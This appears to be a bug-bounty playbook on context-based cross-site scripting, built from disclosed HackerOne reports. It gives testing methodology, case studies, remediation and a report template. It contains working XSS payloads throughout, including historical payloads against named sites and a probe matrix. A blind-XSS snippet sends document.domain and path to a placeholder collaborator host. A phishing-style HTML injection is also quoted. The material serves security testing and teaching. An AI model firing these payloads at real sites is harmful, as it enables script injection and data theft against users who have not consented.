---
title: "Context-Based XSS"
type: playbook
category: context-based-xss
cwe: "CWE-79"
source_count: 196
full_bodies_available: 168
summary_only: 28
archive_accessed: 2026-10-12
---

# Context-Based XSS

## 1. Overview

This is the largest playbook in the knowledge base: **196 sources**, 168 with full
report bodies. It is deliberately a broad bucket, and that requires an explanation.

HackerOne's weakness taxonomy assigns `Cross-site Scripting (XSS) - Generic` to any
report it could not file under Reflected, Stored, or DOM. That "Generic" label is not
a technique — it is an absence of classification. Grouping all of it under one
technique would be as useless as keeping it as one undifferentiated list.

What actually distinguishes these reports is **where the bytes land and who executes
them**. This playbook therefore classifies them by *context and trust boundary*
rather than by payload. That is the distinction that changes your testing method:
you cannot test a URL context with an HTML payload and expect a useful result.

### Why this is one file and not five

The root cause is identical in all of them — missing context-correct output encoding.
The fix is identical — encode per context. Splitting into per-context files would
duplicate the same remediation section five times for no gain. What genuinely differs is
the **methodology**, and that is organised as sub-playbooks inside this file (§4).

The cases that warrant *separate* playbooks because their methodology differs
substantially have been split out: [`DOM-Based-XSS.md`](DOM-Based-XSS.md),
[`Self-XSS.md`](Self-XSS.md), [`File-Upload-and-SVG-XSS.md`](File-Upload-and-SVG-XSS.md),
[`Framework-and-Template-XSS.md`](Framework-and-Template-XSS.md),
[`Browser-Extension-and-Messaging-XSS.md`](Browser-Extension-and-Messaging-XSS.md),
and [`HTML-Injection.md`](HTML-Injection.md).

## 2. Root Cause and Technical Mechanics

The common flow, with the context made explicit:

```
attacker input  →  template or JS  →  [CONTEXT]  →  browser parses  →  execution
```

Sub-classes present in this archive, with a sourced example each:

### 2.1 Blind XSS — the payload fires somewhere else

`CONT-155` (`158461`, Mapbox, $750): the team summary states the researcher reported
*"a stored blind XSS issue on www.mapbox.com/contact"*, fixed by escaping the user
message before forwarding to a middleware server.

`CONT-185` (`197337`, Rockstar, medium, $650): *"an attacker would submit a malicious
XSS payload in an input field but cannot really…"* — the excerpt ends there, but the
summary states the result was *"a XSS vulnerability being exploited on an internal
Rockstar Games domain."*

**Testing consequence:** blind XSS cannot be verified by looking at the submission
page. Use an out-of-band receiver (a collaborator endpoint, `window.name`, DNS
callback) and prove execution before reporting.

### 2.2 Chained impact — the argument for a higher rating

`DOM-014` (`209736`, Starbucks) explicitly claimed Critical via a chain:
*"As described in `#202011` that directly leads to theft of customer account data and
account takeover, hence I set severity to Critical."* The platform recorded medium.

`CONT-126` (`125112`, Uber getrush, $3,000): reflected XSS via an unescaped
`utm_campaign` marketing parameter — no chain needed, because the marketing domain
carried the trust.

Chains raise severity **only when demonstrated**. Asserting a chain you have not walked
is the most common over-claim in this class.

### 2.3 Third-party embeds and integration boundaries

`REFL-023` (`134061`, Uber Newsroom, $2,000): a Livefyre Media Wall embed takes a
`lf-content` parameter of the form
`controlled-domain:GET param 'collection_id':GET param 'content_id'` and fetches JSON
from `https://bootstrap.<controlled-domain>/api/v3.0/content/thread/…`, which is then
rendered. The researcher hosted the JSON on their own domain.

`CONT-095` (`99245`, Mapbox, $1,000): stored XSS in the share page of a hosted map.

**Testing consequence:** whenever a page embeds third-party widgets, ask what the
widget *fetches* and from where. Content the widget pulls from an attacker-controlled
host and renders in the trusted origin is stored XSS with an extra hop.

### 2.4 Parser and rendering contexts

`CONT-035` (`18691`, Phabricator, $1,000) is a **nested-parsing** failure. The
researcher supplied `{meme, src= http://dummy//onerror=eval(prompt(1))// }` and
explained the mechanism:

> "Nested parsing is causing the src value to be treated as a link which is
> automatically made link by fabricator. So, a whole mess-up of syntax happening there.
> `\\` are being used as space separators since those replaced."

Here an inner parser transforms the value *after* the outer parser has validated it —
the canonical **parser-order** vulnerability. The reporter's proposed fix was also
honest about its uncertainty: *"May be to avoid nested parsing, it messes up things.
But the choice is yours since you have more knowledge of the application needs."*

`CONT-057` (`53098`, Twitter, $1,400): `unsafe_link` reflected into markup; the
researcher noted *"in Firefox and Chrome, it is blocked by CSP :)"* and demonstrated in
IE only.

## 3. Attack Surface and Preconditions

| Surface | Case | Note |
| --- | --- | --- |
| Marketing/tracking parameters | `CONT-126` | `utm_campaign` |
| Error and safety-warning pages | `CONT-057`, `CONT-126` | often built by a different, less-reviewed codebase |
| Third-party embeds | `REFL-023` | content fetched from attacker host |
| Admin moderation queues | `CONT-185` | privileged viewer, blind |
| Contact/support forms | `CONT-155` | blind, forwarded to middleware |
| Rich-text / wiki editors | `CONT-035` | nested parsing |
| Currency / locale formatters | `CONT-098` (`104359`, Shopify, $1,000) | admin-configured formatting rendered in storefront |
| Legacy API and legacy frameworks | `CONT-057`, `HTML-002` | different escaping discipline |

## 4. Manual Testing Methodology

Because the payloads vary, methodology is organised by **sub-playbook**.

### 4.1 Context triage (run this first, always)

1. Send `H1XSSMARKER9` in every parameter.
2. Locate the marker in the raw response; note the **immediately preceding and
   following characters**.
3. Classify the context: HTML text / HTML attribute / JS string / URL / CSS /
   `<script>` block / comment / none.
4. Choose the payload from that context's column in §5. Do not skip this — most wasted
   XSS effort comes from testing a JS-context string with an HTML payload.

### 4.2 Blind XSS

1. Register a collaborator endpoint you control.
2. Submit `<img src=x onerror=new Image().src='https://COLLAB/?d='+document.domain>`
   through the form, or the `window.name` variant for `document.domain` capture.
3. Confirm receipt. Only then report.
4. Never file blind XSS on suspicion — the absence of a callback may mean the sink is
   admin-only and simply unvisited.

### 4.3 Embedded and integrated content

1. Inventory third-party scripts on the page (`grep` the HTML for third-party origins).
2. For each, enumerate every parameter it accepts in the URL.
3. For network-fetching widgets, determine the fetched URL's shape — can you control
   the origin *and* the response body? (`REFL-023` did exactly this.)
4. Determine the execution origin for the injected content.

### 4.4 Chaining

1. Establish the XSS first, on its own.
2. Identify what the origin can reach — other same-origin endpoints, session
   identifiers, CSRF tokens, administrative actions.
3. Demonstrate the second stage concretely, or do not claim it. `DOM-014` cited a
   separate report as the chain's second stage; that is the honest form.

### 4.5 Legacy and modern surface coverage

Test both the current frontend and any legacy/marketing/partner subdomain. `CONT-126`
(`getrush.uber.com`) and `CONT-057` (`twitter.com/safety/`) are both non-core
properties — the cheapest findings in the archive.

## 5. Input and Output Context Analysis

This is the operational core of the playbook. Full table also in
[`Reflected-XSS.md`](Reflected-XSS.md) §5; the additions here are the context→payload
mapping and the cases that evidence each.

| Context | Minimal break-out | Sink character | Evidence in this archive |
| --- | --- | --- | --- |
| HTML text | `"><h1>x` | `<` `>` | `REFL-024`, `HTML-008` |
| Attribute, quoted | `x" onmouseover=alert(1) x="` | `"` | `FILT-028`, `HTML-002` |
| Attribute, unquoted | `x onmouseover=alert(1)` | space | `REFL-025`, `CONT-057` |
| JS string, single-quoted | `';alert(1);//` | `'` | `REFL-056` |
| JS string, double-quoted | `";alert(1);//` | `"` | `FILT-017` |
| `<script>` block | `</script><svg onload=alert(1)>` | `</script>` | `REFL-078` |
| `href` / URL | `javascript:alert(1)//` | scheme | `STOR-147`, `BROW-008` |
| CSS (IE only) | `width:expression(alert(1))` | `:` `(` | `FILT-028` |
| Nested parser | depends on inner parser | parser-dependent | `CONT-035` |
| No context (dead value) | — | — | `HTML-010` — correctly reported as non-XSS |

The last row matters: `HTML-010` (`198907`, VK.com) stored `<img src=x` without a
closing bracket, observed that it *"will be parsed in that area, but after saving it,
it won't parse,"* and **declined to claim XSS**. Correct call — see §9.

## 6. Test Cases and Proof-of-Concepts

### 6.1 Historical payloads (verbatim from the cited reports)

| Case | Report | Surface | Payload |
| --- | --- | --- | --- |
| CONT-126 | `125112` | `utm_campaign` | `tttttt'%3C/script%3E%3Cscript%3Ealert(0)%3C/script%3E` |
| CONT-057 | `53098` | `unsafe_link` | `http://example.com onmouseover=alert(1) style=font-size:100pt` |
| CONT-035 | `18691` | meme `src` | `{meme, src= http://dummy//onerror=eval(prompt(1))// }` |
| REFL-023 | `134061` | `lf-content` | `danylod.com/uber.php?:131560603:307477931` + attacker-hosted JSON |
| CONT-098 | `104359` | currency formatting | admin-configured format rendered in storefront |
| HTML-001 | `2735` | first-name field → invite email | `You have been hacked. Click <a href="http://phishing-site">here</a> to reset your password.<div style="display:none">` |

### 6.2 Newly authored illustrations (not from the archive)

**Context probe matrix.** Newly authored; inert markers by design. Use against targets
you are authorised to test.

| Context | Inert probe | Executable probe |
| --- | --- | --- |
| HTML text | `<h1>xss-marker` | `<img src=x onerror=alert(1)>` |
| Attribute (quoted) | `" onmouseover="xss-marker` | `" onmouseover="alert(1)` |
| Attribute (unquoted) | ` onmouseover=xss-marker` | ` onmouseover=alert(1)` |
| JS string `'…'` | `';xss-marker;//` | `';alert(1);//` |
| JS string `"…"` | `";xss-marker;//` | `";alert(1);//` |
| `<script>` block | `</script><h1>xss-marker` | `</script><svg onload=alert(1)>` |
| URL | `javascript:xss-marker//` | `javascript:alert(1)//` |

**Blind-XSS out-of-band receiver.** Newly authored.

```html
<!-- served from an origin you control -->
<img src="x" onerror="new Image().src='https://COLLAB/?domain='+document.domain+'&path='+location.pathname">
```

**Third-party widget inventory.** Newly authored.

```bash
# newly authored — run against an authorised target
curl -s "$URL" | grep -oE 'src="https?://[^"]+\.js[^"]*"' | sort -u
```

## 7. Encoding, Filtering, and Parsing Behavior

The distinct behaviours in this group:

| Behaviour | Case | Consequence |
| --- | --- | --- |
| **Nothing** | `CONT-126` (`utm_campaign` unescaped) | trivial |
| **Right encoder, wrong context** | `CONT-057` (URL in markup) | CSP partly saved them |
| **Nested/ordered parsers** | `CONT-035` | outer validation invalid after inner parse |
| **CSP blocking** | `CONT-057` (non-IE), `HTML-008` | impact capped |
| **Third-party fetch + render** | `REFL-023` | bytes never touch the target's own templates |
| **Blind, off-origin** | `CONT-155`, `CONT-185` | execution in a system the reporter cannot see |
| **Admin-configured formatting** | `CONT-098` | "self-XSS" only until you test a second admin |

`CONT-098` deserves a specific note. An admin configures *currency formatting* in
`/admin/settings/general`, and the configured string then renders across Pinterest,
Twitter, Buy Button and Facebook sales-channel tabs. That is **stored XSS across two
administrators** — reporter A writes, reporter B (or the same reporter as a different
admin) views. See §4.4 and [`Stored-XSS.md`](Stored-XSS.md).

## 8. Impact and Severity Considerations

| Report | Program | H1 severity | Bounty | Note |
| --- | --- | --- | --- | --- |
| `125112` CONT-126 | Uber | not disclosed | $3,000 | marketing subdomain |
| `53098` CONT-057 | Twitter | not disclosed | $1,400 | CSP-limited, IE-only |
| `104359` CONT-098 | Shopify | not disclosed | $1,000 | cross-admin |
| `18691` CONT-035 | Phabricator | not disclosed | $1,000 | any user can write |
| `99245` CONT-095 | Mapbox | not disclosed | $1,000 | third-party pages affected |
| `197337` CONT-185 | Rockstar | medium | $650 | internal domain, blind |
| `158461` CONT-155 | Mapbox | not disclosed | $750 | blind, contact form |
| `209736` DOM-014 | Starbucks | medium (reporter: Critical) | not disclosed | chain asserted, not walked |

**Reading the spread.** The `$650`–`$1,000` cluster is "XSS with no demonstrable
sensitive action." The `$3,000`+ cluster either runs on a high-trust subdomain
(`getrush.uber.com`) or affects every instance of a shared component. Your report
lands where you can justify it — which means you must identify the viewer or the
origin's trust value, every time.

**CSP honesty cuts both ways.** `CONT-057`'s researcher *gained* accuracy by noting CSP
protection elsewhere. Do the same; but do not use CSP to excuse a defect you have
demonstrated — see `REFL-068` in [`Reflected-XSS.md`](Reflected-XSS.md) §9, where
Nextcloud fixed the escaping **and** published the CSP as mitigation.

## 9. False Positives and Limitations

- **"Generic" is HackerOne's label, not a technique.** Never report "Generic XSS."
  Name the context.
- **No dead values.** A parameter reflected but escaped everywhere is not a finding.
- **Blind XSS requires an OOB proof.** Asserting it without a callback is a rejected
  report. `CONT-155` and `CONT-185` both have program summaries confirming
  exploitation, which is exactly the evidence you must produce.
- **Chains must be walked.** `DOM-014`'s Critical claim referenced a separate report
  rather than demonstrating the takeover — that is the right way to reference a chain.
- **IE-only is a scope limit, not a dismissal.** `CONT-057` and `HTML-012` reported
  IE-only behaviour honestly. Verify against a current browser; say what you could and
  could not reproduce.
- **Third-party code needs ownership.** An XSS in a partner's widget on the target's
  domain is a *third-party* report unless the partner is in scope. `DOM-016` was
  accepted because the extension was Algolia's own.
- **Deduplicate.** `217745` opened with *"This report is similar in impact,
  exploitability and root-cause as report #205701"* — good practice; the archive
  contains many such follow-ups.

## 10. Remediation and Regression Testing

### 10.1 Remediation

- **Encode per context at the sink**, for every value, always. Context table in §5.
- **Fix all render paths**, including third-party-facing ones (`CONT-095`).
- **Treat admin-configurable display strings as user input** (`CONT-098`).
- **For widgets that fetch remote content**, validate the response shape and content
  type, and sandbox the render (`REFL-023`).
- **For nested parsers**, parse once, in a fixed order, and validate after the final
  transformation (`CONT-035`).
- **CSP without `unsafe-inline`** as defence in depth.

### 10.2 Regression tests

| Test | Asserts |
| --- | --- |
| Per-context payload matrix (§6.2) against every reflected parameter | each context encoded correctly |
| Cross-admin test on admin-configurable strings (`CONT-098`) | admin A's value safe when admin B views |
| Third-party widget: attacker-controlled fetch origin rejected | no cross-origin trust |
| Nested-parser regression: input re-parsed after transformation | re-validated after final parse |
| Blind sink: OOB receiver on every form that forwards content internally | blind sinks found and escaped |
| CSP assertion (no `unsafe-inline`) | defence in depth |

## 11. Historical Bug Bounty Case Studies

Sourced facts only. With 196 sources this section highlights a representative sample;
the complete inventory is in
[`references/source-index.md`](references/source-index.md), where every one of the 196
has its own row.

---

### CONT-126 — XSS in getrush.uber.com via marketing parameters

- **Program:** Uber · **Report:** <https://hackerone.com/reports/125112>
- **Archive listing:** <https://h1.security.nathan.sx/uber.html>
- **Weakness:** `XSS - Generic` · **Bounty:** $3,000 · **Severity:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** the `utm_campaign` query parameter on `https://getrush.uber.com/business`.

**Payload (as submitted):**
```
https://getrush.uber.com/business?utm_campaign=tttttt%27%3C/script%3E%3Cscript%3Ealert(0)%3C/script%3E&utm_medium=top&utm_source=website
```

**Root cause (reporter, one line):** *"You need to escape the utm_campaign parameter
before rendering it in the HTML."*

**Team summary, verbatim:** *"Reflected XSS in getrush.uber.com due to not escaping
certain tracking parameters."*

**Why it matters here:** the highest-value shape in the whole archive for effort-to-bounty
— a marketing subdomain, a tracking parameter nobody threat-models, and a
one-line root cause.

---

### CONT-057 — XSS in twitter.com/safety/unsafe_link_warning

- **Program:** Twitter · **Report:** <https://hackerone.com/reports/53098>
- **Archive listing:** <https://h1.security.nathan.sx/twitter.html>
- **Weakness:** `XSS - Generic` · **Bounty:** $1,400 · **Severity:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** the `unsafe_link` parameter on the safety interstitial page.

**Reproduction (as submitted):**
```
https://twitter.com/safety/unsafe_link_warning?unsafe_link=https%3A%2F%2Ftwitter.com%2Fsafety%2Funsafe_link_warning%3Funsafe_link%3Dhttp%3A%2F%2Fexample.com%2520onmouseover%3Dalert%281%29%2520style=font-size:100pt%2520
```
Then click "continue" and mouse over it.

**Root cause:** the URL value is placed in markup unquoted, so the trailing
` onmouseover=alert(1) style=…` becomes a real event handler.

**Scope disclosure (reporter):** *"FYI in Firefox and Chrome, it is blocked by CSP :)"* —
and the report states IE-only reproduction.

---

### CONT-035 — XSS in editor by any user (Phabricator, nested parsing)

- **Program:** Phabricator · **Report:** <https://hackerone.com/reports/18691>
- **Archive listing:** <https://h1.security.nathan.sx/phabricator.html>
- **Weakness:** `XSS - Generic` · **Bounty:** $1,000 · **Severity:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** any editor surface where "memes" can be used.

**Payload (as submitted):**
```
{meme, src= http://dummy//onerror=eval(prompt(1))// }
```

**Root cause (reporter):** *"Nested parsing is causing the src value to be treated as a
link which is automatically made link by fabricator. So, a whole mess-up of syntax
happening there. `\\` are being used as space separators since those replaced."*

**Precondition:** any user can write; no privilege required.

**Proposed fix (reporter):** *"May be to avoid nested parsing, it messes up things.
But the choice is yours since you have more knowledge of the application needs."*

---

### CONT-098 — shopifyapps.com XSS on sales channels via currency formatting

- **Program:** Shopify · **Report:** <https://hackerone.com/reports/104359>
- **Archive listing:** <https://h1.security.nathan.sx/shopify.html>
- **Weakness:** `XSS - Generic` · **Bounty:** $1,000 · **Severity:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** currency formatting configured at `*/myshopify.com/admin/settings/general`,
rendered in the Pinterest, Twitter, Buy Button and Facebook sales-channel tabs.

**Reproduction (as submitted):**
1. Remove the pinterest, twitter, buy button and facebook sales channels.
2. Go to `/admin/settings/general` and change currency formatting (see attached
   `currency_formatting.jpg`).
3. Re-add the sales channels at `/admin/channels`.
4. Visit the pinterest, twitter and buy button tabs; then the facebook tab → shop
   (`*/myshopify.com/admin/apps/shopify-facebook/collections`).

**Why it matters here:** the setting is written by one administrator and rendered to
another. That is a **cross-principal** stored XSS and must be tested with two admin
accounts to be credible.

---

### CONT-155 / CONT-185 — Blind XSS confirmed by the programs

- **CONT-155** `158461` — <https://hackerone.com/reports/158461> — Mapbox, $750.
  Team summary, verbatim: *"@sahilsaif reported a stored blind XSS issue on
  www.mapbox.com/contact. To fix the issue we escaped user provided message content
  before sending to our middleware server."*
- **CONT-185** `197337` — <https://hackerone.com/reports/197337> — Rockstar, medium,
  $650. Team summary, verbatim: *"@anshuman_bh discovered that it is possible to exploit
  a Blind XSS vulnerability under the 'MOUTHOFF TO ROCKSTAR' section while providing
  feedback. The result is a XSS vulnerability being exploited on an internal Rockstar
  Games domain."*

Both bodies withheld; evidence level **partial report**. Both are nonetheless strong
cases because the *programs* confirmed exploitation in their summaries.

---

### REFL-023 — Reflected XSS via Livefyre Media Wall in newsroom.uber.com

- **Program:** Uber · **Report:** <https://hackerone.com/reports/134061>
- **Archive listing:** <https://h1.security.nathan.sx/uber.html>
- **Weakness:** `XSS - Generic` · **Bounty:** $2,000 · **Severity:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** the Livefyre Media Wall embed on `newsroom.uber.com`, sourced
from `cdn.livefyre.com/libs/streamhub-permalink/v0.4.1/streamhub-permalink.min.js`.

**Mechanism (researcher):** the `lf-content` parameter is parsed as
`controlled-domain:GET parameter 'collection_id':GET parameter 'content_id'`, and the
embed fetches
`https://bootstrap.<controlled-domain>/api/v3.0/content/thread/?collection_id=…&content_id=…&depth_only=false`.
The researcher hosted crafted JSON at `https://bootstrap.danylod.com/uber.php`.

**Why it matters here:** third-party code, attacker-controlled fetch origin, and
attacker-controlled response body — rendered in `newsroom.uber.com`'s trust context.

---

### Supporting context sources (full bodies retrieved)

- **CONT-095** `99245` — <https://hackerone.com/reports/99245> — Mapbox, $1,000. Team
  summary: *"On November 12th, 2015, enderun07 reported a stored cross-site scripting
  (XSS) issue in the share page of a v3 or v4 map hosted on api.mapbox.com. The
  vulnerability also affected version 2.2.3 and 1.6.5 and earlier of mapbox.js…"*
- **DOM-014** `209736` — <https://hackerone.com/reports/209736> — Starbucks, medium.
  Chained-Critical claim with a named second-stage report.
- **HTML-001** `2735` — <https://hackerone.com/reports/2735> — RelateIQ. HTML injected
  into an outbound **invitation email** via the first-name field — a non-browser sink
  with phishing impact. See [`HTML-Injection.md`](HTML-Injection.md).
- **HTML-010** `198907` — <https://hackerone.com/reports/198907> — VK.com, low. Filter
  weakness reported **without** claiming XSS. See §9.

## 12. Professional Vulnerability Report Template

````markdown
# <Context> XSS in <feature> via <parameter>

## Summary
<Input> is reflected/stored into a <HTML text | HTML attribute | JavaScript string |
URL | CSS> context in <origin> without context-appropriate encoding, allowing script
execution in that origin.

## Severity
<rating> — <viewer or origin trust argument>. CSP: <present/absent, and what it blocks>.

## Affected endpoint
`GET|POST https://<host>/<path>?<param>=` · Program: <name> · Date: <YYYY-MM-DD>

## Vulnerability details
### Input → output
```
<parameter>  →  <handler>  →  <exact reflection point in the response>
```

### Output context
<Show the bytes immediately before and after the marker.>

### Root cause
<Which control is missing or mismatched.>

## Proof of concept
### Reflection (inert)
```
https://<host>/<path>?<param>=H1XSSMARKER9
```
> Found at offset <N>, in a <context>.

### Execution
```
https://<host>/<path>?<param>=<context-appropriate payload>
```
> `document.domain` reads `<origin>`.

### Blind variant (if applicable)
> Callback received at `https://COLLAB/?domain=<origin>` at <timestamp>.

### Chain (only if demonstrated)
> Stage 1: XSS in <origin>. Stage 2: <specific action and result, with evidence>.

## Remediation
<Context-appropriate encoding; see §5 and §10.1.>

## Regression tests
<Context-specific probes.>
````

**Reporting discipline.** Always state the context — that is the finding. Always state
the viewer for blind and stored variants. Disclose CSP. Withhold any chain you have not
walked. State your browser.

## 13. References

- PortSwigger — Cross-site scripting contexts: <https://portswigger.net/web-security/cross-site-scripting>
- OWASP — XSS Prevention Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- OWASP Web Security Testing Guide — Input Injection: <https://owasp.org/www-project-web-security-testing-guide/>
- Related playbooks: [`Reflected-XSS.md`](Reflected-XSS.md),
  [`Stored-XSS.md`](Stored-XSS.md), [`DOM-Based-XSS.md`](DOM-Based-XSS.md),
  [`Self-XSS.md`](Self-XSS.md), [`HTML-Injection.md`](HTML-Injection.md)
- Reports cited: <https://hackerone.com/reports/125112>, <https://hackerone.com/reports/53098>,
  <https://hackerone.com/reports/18691>, <https://hackerone.com/reports/104359>,
  <https://hackerone.com/reports/158461>, <https://hackerone.com/reports/197337>,
  <https://hackerone.com/reports/134061>, <https://hackerone.com/reports/99245>,
  <https://hackerone.com/reports/209736>, <https://hackerone.com/reports/198907>

## 14. Research Gaps and Further Investigation

- **Bucket size limits precision.** 196 "Generic" XSS sources span contexts this
  playbook groups as sub-classes in §2. The classification below is inferred from
  titles and report bodies, not from a program-side taxonomy. With more time these
  should be re-sorted into per-context playbooks and the taxonomy re-examined.
- **`CONT-185`'s summary is truncated** — it ends mid-sentence at *"but cannot really…"*.
  The blind-XSS mechanism on the internal Rockstar domain is not fully recoverable.
- **No modern sources.** All evidence predates 2017. Modern sinks
  (`setHTMLUnsafe`, `Element.setHTML`, shadow DOM, Web Components, `srcdoc`) are absent.
- **Untested:** CSP-bypass-assisted severity reassessment for reports capped by CSP;
  mXSS through `innerHTML` round-trips; injection into `srcdoc`/`iframe` attributes.
- **Suggested original research:** systematically re-test the "Generic" bucket's
  contexts to determine how often the true context differs from what the report title
  implied. If it differs often, that is a finding in its own right about how titles
  should be written.
